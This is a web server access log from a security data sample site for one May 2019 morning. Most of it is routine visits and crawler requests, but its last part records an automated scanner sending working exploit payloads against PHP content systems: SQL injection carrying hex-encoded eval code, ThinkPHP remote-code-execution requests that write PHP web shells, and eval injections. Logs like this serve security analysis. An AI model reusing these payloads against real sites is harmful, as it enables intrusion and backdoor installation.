209.58.147.244 - - [24/May/2019:05:10:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
157.55.39.136 - - [24/May/2019:05:15:18 -0700] "GET /self.logs/2016/error.log.2016-03-22.gz HTTP/1.1" 200 707 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.130 - - [24/May/2019:05:15:24 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [24/May/2019:05:15:26 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
193.50.192.66 - - [24/May/2019:05:17:23 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
193.50.192.66 - - [24/May/2019:05:17:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
193.50.192.66 - - [24/May/2019:05:17:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
87.255.202.142 - - [24/May/2019:05:21:50 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
111.73.46.48 - - [24/May/2019:05:28:44 -0700] "HEAD /admin/ HTTP/1.1" 404 320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0" 
207.46.13.224 - - [24/May/2019:05:31:09 -0700] "GET /self.logs/access.log.2018-02-16.gz HTTP/1.1" 200 40412 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [24/May/2019:05:36:13 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [24/May/2019:05:39:55 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
41.223.160.131 - - [24/May/2019:05:40:33 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
123.125.67.158 - - [24/May/2019:05:50:35 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.160 - - [24/May/2019:05:50:35 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.224 - - [24/May/2019:05:50:36 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.227 - - [24/May/2019:05:50:37 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.227 - - [24/May/2019:05:50:37 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.164 - - [24/May/2019:05:50:37 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.222 - - [24/May/2019:05:50:39 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.228 - - [24/May/2019:05:50:39 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.222 - - [24/May/2019:05:50:39 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.34 - - [24/May/2019:05:53:25 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.160 - - [24/May/2019:05:53:26 -0700] "GET / HTTP/1.1" 304 152 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
193.113.37.9 - - [24/May/2019:05:53:41 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:53:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:53:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 304 166 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:53:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 164 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:54:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 552 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:54:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 733 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:54:13 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
193.113.37.9 - - [24/May/2019:05:54:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dns.html HTTP/1.1" 200 1731 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
141.196.202.19 - - [24/May/2019:05:54:57 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
157.55.39.134 - - [24/May/2019:05:55:35 -0700] "GET /self.logs/access.log.2018-09-27.gz HTTP/1.1" 200 47297 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
193.113.37.9 - - [24/May/2019:05:55:01 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
207.46.13.224 - - [24/May/2019:06:04:48 -0700] "GET /self.logs/2016/access.log.2016-09-27.gz HTTP/1.1" 200 11813 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [24/May/2019:06:05:27 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
141.136.170.81 - - [24/May/2019:06:05:30 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
216.244.66.245 - - [24/May/2019:06:08:39 -0700] "GET /b.zip HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.165 - - [24/May/2019:06:10:07 -0700] "GET /self.logs/error.log.2017-08-13.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.224 - - [24/May/2019:06:17:00 -0700] "GET /self.logs/access.log.2019-03-27.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
194.176.221.149 - - [24/May/2019:06:27:28 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
194.176.221.149 - - [24/May/2019:06:27:28 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
194.176.221.149 - - [24/May/2019:06:27:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
194.176.221.149 - - [24/May/2019:06:27:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
194.176.221.149 - - [24/May/2019:06:27:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
95.151.141.199 - - [24/May/2019:06:27:41 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
95.151.141.199 - - [24/May/2019:06:27:42 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
95.151.141.199 - - [24/May/2019:06:27:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
95.151.141.199 - - [24/May/2019:06:27:43 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
95.151.141.199 - - [24/May/2019:06:27:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
90.154.116.237 - - [24/May/2019:06:32:24 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
43.250.201.69 - - [24/May/2019:06:32:44 -0700] "GET / HTTP/1.1" 200 12511 "https://m.baidu.com/from=1022560w/bd_page_type=1/ssid=0/uid=0/pu=usm%401%2Csz%40320_1001%2Cta%40iphone_2_9.0_24_71.0/baiduid=757759882A4E64D74EA0DD5F036BD203/w=0_10_/t=iphone/l=1/tc?clk_type=1&vit=osres&l=1&baiduid=757759882A4E64D74EA0DD5F036BD203&w=0_10_security%E6%97%A5%E6%9C%AC%E5%A5%B3%E4%BC%98&t=iphone&ref=www_iphone&from=1022560w&ssid=0&uid=0&lid=8488624409407220642&bd_page_type=1&pu=usm%401%2Csz%40320_1001%2Cta%40iphone_2_9.0_24_71.0&order=2&fm=alop&isAtom=1&is_baidu=0&tj=www_normal_2_0_10_title&url_mf_score=5&m=8&cltj=cloud_title&asres=1&title=SecRepo-SecurityDataSamplesRepository&dict=32&wd=&eqid=75cda6ecfa6d6c00100000055ce7f273&w_qd=IlPT2AEptyoA_yimGUCsCSogtoEkdyRO7pBYham17a&bdver=1&tcplug=1&sec=38773&di=d9bff19d08e8da2a&bdenc=1&tch=124.0.112.437.0.0&nsrc=IlPT2AEptyoA_yixCFOxXnANedT62v3IEQGG_ztV1SirjU0te4viZQRAJDL6X7v0UpCgbDXOtRgIxa&clk_info=%7B%22srcid%22%3A1599%2C%22tplname%22%3A%22www_normal%22%2C%22t%22%3A1558704763878%2C%22xpath%22%3A%22div-article-header-div-a-h3-span-em%22%7D" "Mozilla/5.0 (Linux; Android 9; COL-AL10 Build/HUAWEICOL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36" 
43.250.201.69 - - [24/May/2019:06:32:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; COL-AL10 Build/HUAWEICOL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36" 
43.250.201.69 - - [24/May/2019:06:32:45 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; COL-AL10 Build/HUAWEICOL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36" 
43.250.201.69 - - [24/May/2019:06:32:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 9; COL-AL10 Build/HUAWEICOL-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36" 
109.201.154.212 - - [24/May/2019:06:34:00 -0700] "HEAD / HTTP/1.1" 301 209 "https://uptime.com/secrepo.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
207.46.13.224 - - [24/May/2019:06:38:26 -0700] "GET /Datasets%20Description/Network/ HTTP/1.1" 200 668 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
185.136.56.254 - - [24/May/2019:06:50:32 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15" 
185.136.56.254 - - [24/May/2019:06:50:33 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15" 
185.136.56.254 - - [24/May/2019:06:50:33 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15" 
185.136.56.254 - - [24/May/2019:06:50:34 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15" 
185.136.56.254 - - [24/May/2019:06:50:34 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.2.6.1.1 CFNetwork/978.0.7 Darwin/18.6.0 (x86_64)" 
185.136.56.254 - - [24/May/2019:06:50:35 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.2.6.1.1 CFNetwork/978.0.7 Darwin/18.6.0 (x86_64)" 
157.55.39.136 - - [24/May/2019:07:05:14 -0700] "GET /self.logs/error.log.2017-04-24.gz HTTP/1.1" 200 838 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
183.166.112.226 - - [24/May/2019:07:08:47 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:48 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:48 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:48 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:49 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:50 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:51 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:51 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:52 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:53 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:53 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:53 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:08:54 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=loybm.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=loybm.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:15 -0700] "GET /loybm.php HTTP/1.1" 404 295 "http://www.secrepo.com/loybm.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:16 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:17 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:18 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=zwmkc.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zwmkc.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:36 -0700] "GET /zwmkc.php HTTP/1.1" 404 295 "http://www.secrepo.com/zwmkc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
183.166.112.226 - - [24/May/2019:07:09:37 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 294 